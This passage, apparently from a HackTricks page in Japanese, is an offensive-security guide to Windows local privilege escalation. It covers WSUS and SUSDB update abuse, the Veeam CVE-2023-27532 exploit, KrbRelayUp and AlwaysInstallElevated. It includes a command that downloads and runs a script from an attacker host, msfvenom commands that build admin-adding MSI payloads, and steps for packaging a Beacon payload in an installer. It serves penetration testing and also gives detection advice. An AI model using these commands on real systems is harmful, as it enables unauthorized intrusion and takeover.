# Windows ローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windows のローカル権限昇格ベクトルを探すのに最適なツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、Windows の権限昇格に関する一般的な手法を、いくつかの基礎的なガイドからまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的な列挙手順には、コミュニティのワークショップやチェックリストの内容も取り入れています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去の攻撃手法には、Windows の権限昇格に関する DerbyCon のプレゼンテーションも含まれています。<sup>[[5]](#references)</sup>

## Windows の基礎知識

### アクセストークン

**Windows のアクセストークンについて知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**ACL - DACL/SACL/ACE の詳細については、次のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### 整合性レベル

**Windows の整合性レベルについて知らない場合は、続ける前に次のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、**システムの列挙や実行ファイルの実行を妨げたり、さらにはあなたの活動を検出したりする**さまざまな仕組みがあります。権限昇格の列挙を始める前に、次の**ページを読み**、これらすべての**防御機構を列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、オフラインでの UEFI NVRAM の編集を、起動前 DMA と Windows の `SYSTEM` メモリパッチングにつなげることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess によるサイレント昇格

`RAiLaunchAdminProcess` 経由で起動された UIAccess プロセスは、AppInfo のセキュアパスチェックを回避すると、プロンプトなしで High IL に到達するために悪用できます。専用の UIAccess/Admin Protection 回避手順はこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop のアクセシビリティレジストリ伝播を悪用すると、任意の SYSTEM レジストリ書き込み（RegPwn）が可能になります:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows ビルドには、特権を持つローカル NTLM 認証を再利用された SMB TCP 接続経由で反射させる、**SMB arbitrary-port** の LPE 経路も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性があるか確認してください（適用済みのパッチも確認してください）。

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### バージョン別Exploit

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件を超えるセキュリティ脆弱性が登録されており、Windows環境が**非常に大きな攻撃対象領域**となることが分かります。

**システム上で実行**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OSのビルド、インストール済みの更新プログラム、該当する可能性のあるアドバイザリ候補を一覧表示します。結果が適用可能か判断する前に、正確な製品と後続の更新プログラムを確認してください。

バージョン固有のローカルExploitを使用する場合は、OSのアーキテクチャだけでなく、**実行中のプロセスのアーキテクチャ**も確認してください。64-bit Windowsでは、32-bitプロセスは[WOW64ファイルシステムリダイレクト](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector)の影響を受けます。`%windir%\System32`は通常、32-bitシステムディレクトリに解決されますが、`%windir%\Sysnative`を使うと、そのプロセスからネイティブのシステムディレクトリにアクセスできます。このエイリアスは64-bitプロセスでは使用できません。OSビルドや不足しているKBの候補だけでは、Exploitが可能だとは証明できません。実行中のビルド、インストール済みまたは後続の更新プログラム、プロセスのアーキテクチャ、Exploitの前提条件を、該当する問題の[Microsoftセキュリティ情報](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)と照合してください。

サービスのメモリ破損の例については、[クライアントが制御するMIDI共有メモリリングのオフセット](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions)を参照してください。公開されているスタックオフセットは、テスト対象のビルドにのみ適用されます。`LOCAL SERVICE`への昇格と、その後の[SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md)を使った`SYSTEM`への昇格は別の段階です。<sup>[[44]](#references)</sup>

**システム情報を使ってローカルで実行**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGithubリポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に認証情報や使えそうな情報が保存されていませんか？

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell の履歴

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell トランスクリプトファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で有効にする方法を確認できます。

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` はあくまで例です。[PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) は通常、各ユーザーの Documents フォルダーに書き込みますが、`OutputDirectory` の設定や `Start-Transcript -OutputDirectory` によって、ファイルの保存先を共有フォルダーや隠しフォルダーに変更できます。transcript を確認する前に、実際の出力先とファイルの ACL を確認してください。transcript にはコマンドの引数や出力が記録されていることがあり、資格情報が含まれる場合もあります。読み取り可能な transcript は、内容から利用可能な高権限の ID が判明し、その ID が関連するコンテキストでログオンできる場合にのみ、手掛かりとなります。

### PowerShell Module Logging

PowerShell のパイプライン実行の詳細として、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が記録されます。ただし、実行の詳細や出力結果がすべて記録されるとは限りません。

有効にするには、ドキュメントの「Transcript ファイル」セクションの手順に従い、**「Powershell Transcription」** ではなく **「Module Logging」** を選択してください。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell ログの直近15件のイベントを表示するには、次を実行します:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

スクリプトの実行時に、アクティビティ全体とその内容がすべて記録され、コードの各ブロックが実行と同時に文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、フォレンジックや悪意ある動作の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な分析情報が得られます。

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block のログイベントは、Windows Event Viewer の次のパスで確認できます: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
直近20件のイベントを表示するには、次を使用します:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### インターネット設定

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ドライブ

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

先ほどのガイダンスでは、リスクを次のようにまとめていました。

更新プログラムの取得に http**S** ではなく http が使われている場合、システムを侵害できる可能性があります。

HTTP の WSUS エンドポイントは、更新メタデータの傍受を調査する手掛かりになります。悪用できるかどうかは、クライアントがその WSUS サーバーを使用しているか、攻撃者がその通信を傍受または制御できるか、さらにクライアントの更新プログラムに対する信頼設定やインストールポリシーにも左右されます。URL だけでは、コード実行が可能だとは判断できません。[Microsoft は WSUS メタデータに TLS を推奨しています](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus)。

まず、ネットワークで非 SSL の WSUS 更新が使用されているかを確認するため、cmd で次のコマンドを実行します。

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

または、PowerShell では次のようにします:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

次のような返信が返ってきた場合：

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` の値が `1` の場合。

元の適用可能性に関する記述は次のとおりです。

その場合、**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSのエントリは無視されます。

`UseWUServer` が `1` の場合、Windows Updateは設定済みのイントラネットサービスを使用します。これはHTTP interceptionの前提条件を確認するものですが、interception、悪意のある更新プログラムの受け入れ、または昇格された権限でのインストールが可能であることを証明するものではありません。`0` の場合、このポリシーで設定されたWSUSエンドポイントは選択されません。

この脆弱性をexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus)などのツールを使用できます。これらは、非SSLのWSUSトラフィックに「偽の」更新プログラムを注入するための、武器化されたMiTM exploitスクリプトです。

こちらの研究資料を参照してください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、このバグが悪用する脆弱性は次のとおりです。

> ローカルユーザーのproxyを変更でき、Windows UpdatesがInternet Explorerの設定で指定されたproxyを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus)をローカルで実行して自分のトラフィックをinterceptし、asset上で昇格されたユーザーとしてコードを実行できます。
>
> さらに、WSUSサービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUSのホスト名用の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すれば、HTTPとHTTPSの両方のWSUSトラフィックをinterceptできます。WSUSには、証明書に対してTOFU（trust-on-first-use）型の検証を実装するHSTSのような仕組みはありません。提示された証明書がユーザーによって信頼されており、正しいホスト名を持つ場合、サービスはその証明書を受け入れます。

この脆弱性は、ツール[**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（公開後）を使用してexploitできます。

### WSUS管理者が制御する更新プログラム

現在のidentityがWSUSサーバー上で更新プログラムを**公開および承認**できる場合、別の攻撃経路が存在します。サーバーの`WSUS Administrators`グループへの実効的な所属と、委任されたWSUS権限を確認し、承認済みの更新プログラムを受信するクライアントコンピューターグループを特定します。[Microsoftは更新プログラムの承認にWSUS Administrator権限を要求しており](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate)、[公開時の信頼関係についても説明しています](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29)。クライアントは、ローカルで公開されたコンテンツの署名に使われた証明書を信頼する必要があります。これを権限昇格の攻撃経路と判断する前に、対象の更新プログラムが署名され受け入れられること、対象に適用可能であること、より高い権限のコンテキストでインストールされることを確認してください。HTTPの`WUServer`値やグループ名だけでは、これらの条件が満たされているとは判断できません。

### SUSDBカスタム更新プログラムの悪用：`.txt`/`.esd`経由の署名なしpayload

これはHTTP WSUS接続のinterceptionとは異なる信頼境界の問題です。前提条件は、カスタム更新プログラムの公開と承認を行うための、**WSUSデータベース（`SUSDB`）のストアドプロシージャへの十分なアクセス権**です。実用的な侵入経路の一つは、上流のWSUSコンピューターアカウントを、`SUSDB`をホストする別のMSSQLサーバーに中継することです。具体的な前提条件は環境によって異なるため、SQL administrator権限があると決めつけず、まず`EXECUTE`権限を列挙してください。<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530からLDAP、SMB、またはAD CSへのWSUSクライアント認証の中継を利用する別の攻撃経路については、[WSUS HTTPを悪用したNTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8)を参照してください。

#### 外部データベースへの中継とプロシージャ権限を確認する

WSUSが外部SQL Serverを使用する環境では、まずWSUSサーバーアカウントがデータベースに認証できるか、またNTLM relayがそのリスナーに到達するかを確認してください。サーバーのSQLロールによっては、テーブルへの直接書き込みが拒否されていても、更新プログラムの公開に使うプロシージャを実行できる場合があります。`SUSDB`に対する`UPDATE`が失敗しても、公開が阻止されているとは限りません。カスタム更新プログラムを試す前に、認可されたSQLセッションで実効identity、ロールの所属、プロシージャ権限を確認してください。<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

ライブの手順定義とインストール済みの `SoftwareDistributionPackage.xsd` は、有効な更新メタデータを再構成する際に役立ちます。バンドルの親とペイロードの子には、それぞれ `UpdateIdentity`（フラグメント型 `1`）、`LocalizedProperties`（`4`）、`ExtendedProperties`（`2`）が必要です。各 `spImportUpdate` 呼び出しで返されるローカルリビジョン ID を取得し、バンドルの関係、ダイジェスト、サイズ、コンテンツ URL、リビジョンの整合性を保ってください。これは状態を持つ公開ワークフローであり、ストアドプロシージャの呼び出しが1回成功しただけでは、クライアント側で実行された証拠にはなりません。<sup>[[38]](#references)</sup>

#### 更新プログラムを作成し、対象を指定して承認する

カスタム更新プログラムのワークフローでは、正規の WSUS 手順を制限付きの公開 API として利用します。重要な状態遷移は次のとおりです。<sup>[[38]](#references)</sup>

| 段階 | 関連するストアドプロシージャ |
| --- | --- |
| 更新プログラムのメタデータをインポートする | `spImportUpdate` |
| 前提条件、ローカライズ、拡張 XML フラグメントを保存する | `spSaveXMLFragment` |
| コンテンツダイジェストを攻撃者が制御する URL に関連付ける | `spSetBatchURL` |
| コンピューターグループを列挙・作成し、クライアントを追加する | `spGetAllTargetGroups`、`spCreateTargetGroup`、`spGetComputerTargetByName`、`spAddComputerToTargetGroup` |
| そのグループにインストールを承認する | `@actionID = 0` および `@isAssigned = 1` を指定した `spDeployUpdate` |

ファイル名、ダイジェスト、サイズ、および `CommandLineInstallation` ハンドラーは、インポートしたメタデータ／フラグメント間で一致している必要があります。コンテンツ URL とターゲットグループを設定した後の最終承認は、次のようになります。例の GUID を再利用せず、新しい更新プログラム、グループ、デプロイメントの識別子を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### 拡張子を利用した署名バイパス

WSUSは通常、署名されていない任意の実行可能コンテンツを拒否します。しかし、`C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` の .NET `VerifyFile` 処理では、指定されたファイル名が `.txt` または `.esd` で終わる場合、証明書チェックのフラグが false に設定されます。これにより、データがテキストまたは正規のESDイメージであることを事前に確認せずに、`CheckCertificateSignature` がスキップされます。そのため、たとえば `payload.exe.txt` という名前の変更されていないPEファイルは、コンテンツ検証を通過し、その後、更新プログラムのコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS互換のステージングと自動化

`spDeployUpdate`を呼び出すと、WSUSは登録済みのコンテンツを取得します。配信元はBITSのHTTP要件を満たす必要があります。URLにアクセスできるだけでは不十分で、転送では最初に`HEAD`/`GET`フローが実行され、バイト範囲リクエストが使用されます。Rangeをサポートしていないサーバーでは、BITSがRangeプロトコルヘッダーを必要としていることを示すWSUS同期の`EventId=364`が発生します。<sup>[[39]](#references)</sup>

調査用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、インポート／フラグメント／URL／グループ／デプロイメントの一連の処理に必要なSQLを生成し、その実行用に改変されたMSSQLクライアントを含み、コンテンツのステージング用に`BitsWebServer.py`を提供します。許可されたラボでの最小限の実行例は次のとおりです。<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### 無人実行と再試行による永続化

クライアント側の動作はポリシーに依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` のオプション `4 - Auto download and schedule install` を設定すると、承認済みの更新プログラムがダウンロードされ、設定されたスケジュールに従って、ユーザーが手動で選択しなくてもインストールされます。テストでは、更新プログラムが失敗または未完了のままの payload は、callback process の終了直後に再び提示されました。そのため、再試行の動作が繰り返し実行される永続化につながる可能性があります。ただし、クライアントに更新失敗の状態が表示されるため、目立ちます。<sup>[[39]](#references)</sup>

#### 検知とハードニングのポイント

この一連の手法において、サーバー側とクライアント側で有用な調査ポイントは次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を監査し、新しいターゲットグループ、外部コンテンツの配信元、`.txt`/`.esd` の更新 payload、想定外の主体（特にコンピューターアカウント以外）によるデプロイを調査する。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認し、拡張子を信用せず、拡張子とコンテンツのマジックナンバーを照合して検証状況を関連付ける。
- Windows Update のインストールが繰り返し失敗・再試行されていないか、また `.txt` または `.esd` という名前のコンテンツから PE が実行されていないか、想定外の子プロセス起動やネットワーク通信が発生していないかを調査する。
- データベースサービスでサポートされている場合は、認証に Extended Protection を必須とし、データベースへのネットワークアクセスを WSUS サーバーと許可された管理システムに制限する。カスタム更新手順に対する `EXECUTE` 権限を最小限にし、監査する。

## サードパーティ製 Auto-Updater と Agent IPC（local privesc）

多くの企業向けエージェントは、localhost 上の IPC インターフェースと特権付き更新チャネルを公開しています。登録先を攻撃者のサーバーに強制でき、updater が不正な root CA や弱い署名者チェックを信頼する場合、ローカルユーザーは悪意のある MSI を配信し、SYSTEM サービスにインストールさせることができます。Netskope stAgentSvc の一連の手法（CVE-2025-0309）に基づく一般化された手法については、こちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（TCP 9401 経由の SYSTEM）

バージョン固有の元の説明と偵察メモは次のとおりです。

Veeam B&R < `11.0.1.1261` は、**TCP/9401** 上で localhost サービスを公開しており、攻撃者が制御するメッセージを処理することで、**NT AUTHORITY\SYSTEM** として任意のコマンドを実行できます。<sup>[[12]](#references)</sup>

- **偵察**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。

Veeam Backup & Replication と Cloud Connect は、既定で **TCP/9401** 上のコアバックアップサービスを使用します。[Veeam のアドバイザリ](https://www.veeam.com/kb4424)には、バックアップネットワークの境界内で、暗号化された構成データベースの認証情報が認証なしで漏えいする問題が記載されています。また、別の公開 PoC では、**NT AUTHORITY\SYSTEM** としてコマンドを実行する手法が実証されています。<sup>[[12]](#references)</sup> サービスは localhost 以外にもバインドする場合があるため、実際のアドレスと PID を確認してください。

- **偵察**: TCP/9401 が `Veeam.Backup.Service.exe` に属することを確認してから、インストール済みの製品とパッチのメタデータを調べます。`netstat -ano | findstr 9401` と `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` は手がかりであり、完全なパッチ確認ではありません。
- **修正済みの最低バージョン**: Veeam は、**11a build 11.0.1.1261 P20230227** および **12 build 12.0.0.1420 P20230223** を最初の修正済みリリースとして挙げています。それ以前のリリースは影響を受けます。4つの要素からなるファイルバージョンだけでは、同じビルド番号の未パッチのベースビルドと、後続のパッチ適用済みビルドを区別できません。境界となるビルドを修正済みと判断する前に、[ベンダーのビルド履歴](https://www.veeam.com/kb2680)でパッチ識別子を確認してください。
- **Exploit**: 必要な Veeam DLL とともに、`VeeamHax.exe` などの PoC を同じディレクトリに配置し、ローカルソケット経由で SYSTEM payload を実行します:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

サービスはコマンドを SYSTEM として実行します。

引用された PoC は、追加の前提条件が満たされる場合に SYSTEM としてコマンドを実行できることを示しています。ベンダーの勧告には、認証情報の漏えいに関する問題が記載されています。

## KrbRelayUp

元のデフォルト環境に関する説明は次のとおりです。

特定の条件下で、Windows の **ドメイン** 環境に **ローカル権限昇格** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を設定できる self-rights を持つこと、ユーザーがドメイン内にコンピューターを作成できることが含まれます。これらの **要件** は **デフォルト設定** で満たされる点に注意してください。

適切な COM サーバーが認証を行い、中継された principal が対象オブジェクトに対する権限を持つ場合、ローカル Kerberos relay によって、低権限のログオンから特権ディレクトリへの書き込みに至ることがあります。[KrbRelay documents](https://github.com/cube0x0/KrbRelay) では、RBCD と `msDS-KeyCredentialLink` (shadow-credential) の LDAP 書き込みの両方が扱われており、KrbRelayUp はこれらの経路の一部を自動化します。RBCD の chain には、適用可能な delegation と対象オブジェクトへの権限が必要です。一方、shadow-credential の chain には、key-credential の書き込み権限と、証明書認証の経路をサポートする KDC が必要です。どちらの経路も、ドメインへの参加だけで成立するものではありません。

実際の DC の [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) と [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) のポリシー、中継される ID のオブジェクト ACL、選択した COM クラスの認証レベルと impersonation レベルを確認してください。呼び出し元のログオン種別と認証情報のコンテキストも重要です。WinRM セッションは、対話型ログオンや新しい認証情報を使うログオンとは異なる動作をする場合があります。ファイアウォール/OXID のルーティングやインストール済みの更新プログラムによっても結果が変わることがあります。許容的なポリシーや一致する ACL は、確認対象として扱ってください。パッシブな列挙で COM coercion、relay 認証、ディレクトリへの書き込みを引き起こしてはいけません。マシンアカウントの shadow credential はマシンチケットにつながる可能性がありますが、そこから別の DCSync 経路に進めるのは、そのアカウントが必要なディレクトリレプリケーション権限を持つ場合に限られます。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) の exploit を確認してください。

攻撃の流れについては、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

これら 2 つのレジストリキーが **有効** (値が **0x1**) の場合、任意の権限レベルのユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **インストール** (実行) できます。

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

meterpreter session があれば、モジュール **`exploit/windows/local/always_install_elevated`** を使ってこの手法を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使うと、権限昇格用の Windows MSI バイナリを現在のディレクトリに作成できます。このスクリプトは、ユーザーまたはグループの追加を促す、コンパイル済みの MSI インストーラーを書き出します（そのため、GIU アクセスが必要です）。

```
Write-UserAddMSI
```

作成した binary を実行して、privileges を昇格します。

### MSI Wrapper

このツールを使って MSI wrapper を作成する方法は、このチュートリアルを参照してください。**command lines**を**実行**するだけでよい場合は、「**.bat**」ファイルを wrapper にできることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、新しい Windows EXE TCP payload を生成し、`C:\privesc\beacon.exe` に保存します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに「installer」と入力します。**Setup Wizard** プロジェクトを選択し、**Next** をクリックします。
- プロジェクト名（例：**AlwaysPrivesc**）を入力し、場所に **`C:\privesc`** を指定します。**place solution and project in the same directory** を選択して、**Create** をクリックします。
- 手順 3/4（含めるファイルの選択）に進むまで、**Next** をクリックします。**Add** をクリックし、先ほど生成した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
  - **Author** や **Manufacturer** など、インストールされるアプリをより正規のものに見せるために変更できるプロパティもあります。
- プロジェクトを右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、installer の実行直後に Beacon payload が実行されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
  - 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示される場合は、プラットフォームが x64 に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルを**バックグラウンドで****インストール**するには：

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

この脆弱性を exploit するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## ウイルス対策ソフトと検出ツール

### 監査設定

これらの設定によって、何が**ログに記録される**かが決まるため、注意してください。

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

